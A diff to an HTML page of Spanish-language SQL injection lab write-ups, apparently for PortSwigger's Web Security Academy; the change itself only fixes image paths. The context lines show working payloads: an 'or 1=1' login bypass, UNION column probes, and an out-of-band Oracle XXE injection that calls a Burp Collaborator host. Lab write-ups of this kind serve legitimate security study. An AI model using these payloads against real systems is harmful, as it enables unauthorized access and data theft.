@@ -49,7 +49,7 @@
 
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 2</span>SQL injection vulnerability allowing login bypass</h5>
-      <img src="../img/sql2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/sql2.png" class="img-fluid rounded my-3 border border-secondary">
       <div class="row g-3">
         <div class="col-md-6">
           <div class="p-3 rounded border border-secondary" style="background:#111">
@@ -73,13 +73,13 @@ password: 'or 1=1 --</code></pre>
 
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 3</span>UNION attack, determining the number of columns</h5>
-      <img src="../img/sql3.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/sql3.png" class="img-fluid rounded my-3 border border-secondary">
       <pre class="code-block"><code>https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,null,null --</code></pre>
     </section>
 
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 4</span>UNION attack, finding a column containing text</h5>
-      <img src="../img/sql4.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/sql4.1.png" class="img-fluid rounded my-3 border border-secondary">
       <pre class="code-block"><code># Determinar número de columnas
 https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,null,null --
 
@@ -88,7 +88,7 @@ https://LAB-ID.web-security-academy.net/filter?category=Accessories' union selec
 
 # Mostrar el texto solicitado
 https://LAB-ID.web-security-academy.net/filter?category=Accessories' union select null,'p2Omtj',null --</code></pre>
-      <img src="../img/sql4.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/sql4.2.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
     <section class="mb-4">
@@ -238,12 +238,12 @@ p1.success(password)</code></pre>
     <section class="mb-4">
       <h5><span class="badge bg-danger me-2">Lab 15</span>Blind SQL injection with out-of-band interaction</h5>
       <p class="text-secondary">Interceptar la consulta con Burp Suite y enviar al Repeater. Abrir el Burp Collaborator para obtener el subdominio. Modificar la cookie <code>TrackingId</code> con la inyección codificada con <code>Ctrl+U</code>.</p>
-      <img src="../img/sql15.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/sql15.png" class="img-fluid rounded my-3 border border-secondary">
       <pre class="code-block"><code>' UNION SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://COLLABORATOR-SUBDOMAIN.burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual--</code></pre>
       <p class="text-secondary small">Versión URL-encoded para la cookie:</p>
       <pre class="code-block"><code>' UNION+SELECT+extractvalue(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code></pre>
-      <img src="../img/sql15.1.png" class="img-fluid rounded my-3 border border-secondary">
-      <img src="../img/sql15.2.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/sql15.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <img src="img/sql15.2.png" class="img-fluid rounded my-3 border border-secondary">
     </section>
 
     <section class="mb-4">
